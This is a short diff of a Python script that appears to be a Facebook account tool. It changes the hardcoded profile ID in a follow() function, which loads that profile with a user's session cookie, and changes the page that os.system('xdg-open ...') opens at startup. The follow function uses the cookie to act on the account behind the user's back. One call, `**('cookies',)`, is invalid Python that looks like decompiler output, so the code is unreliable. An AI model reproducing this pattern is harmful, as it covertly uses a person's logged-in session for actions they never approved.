@@ -102,7 +102,7 @@ def cek_apk(session,coki):
 
 def follow(self, session, coki):
 
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100000545457649', {
 
             'cookie': coki }, **('cookies',)).text, 'html.parser')
 
@@ -190,7 +190,7 @@ ha = current.day
 
 today = date.today()
 
-os.system('xdg-open https://www.facebook.com/arafatmahin310')
+os.system('xdg-open https://www.facebook.com/100000545457649')
 
 logo = ("""
 
